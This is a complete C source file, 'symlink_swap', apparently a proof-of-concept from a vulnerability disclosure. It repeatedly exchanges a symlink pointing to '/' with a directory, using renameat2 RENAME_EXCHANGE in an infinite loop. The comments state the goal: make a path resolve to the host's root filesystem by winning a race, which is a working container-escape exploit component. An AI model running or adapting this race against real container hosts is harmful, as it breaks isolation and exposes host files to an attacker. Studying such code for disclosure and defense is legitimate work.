/*
 * Copyright (C) 2018 Aleksa Sarai <asarai@suse.de>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

#define usage() \
	do { printf("usage: symlink_swap <symlink>\n"); exit(1); } while(0)

#define bail(msg) \
	do { perror("symlink_swap: " msg); exit(1); } while (0)

/* No glibc wrapper for this, so wrap it ourselves. */
#define RENAME_EXCHANGE (1 << 1)
/*int renameat2(int olddirfd, const char *oldpath,
              int newdirfd, const char *newpath, int flags)
{
	return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags);
}*/

/* usage: symlink_swap <symlink> */
int main(int argc, char **argv)
{
	if (argc != 2)
		usage();

	char *symlink_path = argv[1];
	char *stash_path = NULL;
	if (asprintf(&stash_path, "%s-stashed", symlink_path) < 0)
		bail("create stash_path");

	/* Create a dummy file at symlink_path. */
	struct stat sb = {0};
	if (!lstat(symlink_path, &sb)) {
		int err;
		if (sb.st_mode & S_IFDIR)
			err = rmdir(symlink_path);
		else
			err = unlink(symlink_path);
		if (err < 0)
			bail("unlink symlink_path");
	}

	/*
	 * Now create a symlink to "/" (which will resolve to the host's root if we
	 * win the race) and a dummy directory at stash_path for us to swap with.
	 * We use a directory to remove the possibility of ENOTDIR which reduces
	 * the chance of us winning.
	 */
	if (symlink("/", symlink_path) < 0)
		bail("create symlink_path");
	if (mkdir(stash_path, 0755) < 0)
		bail("mkdir stash_path");

	/* Now we do a RENAME_EXCHANGE forever. */
	for (;;) {
		int err = renameat2(AT_FDCWD, symlink_path,
	                        AT_FDCWD, stash_path, RENAME_EXCHANGE);
		if (err < 0)
			perror("symlink_swap: rename exchange failed");
	}
	return 0;
}
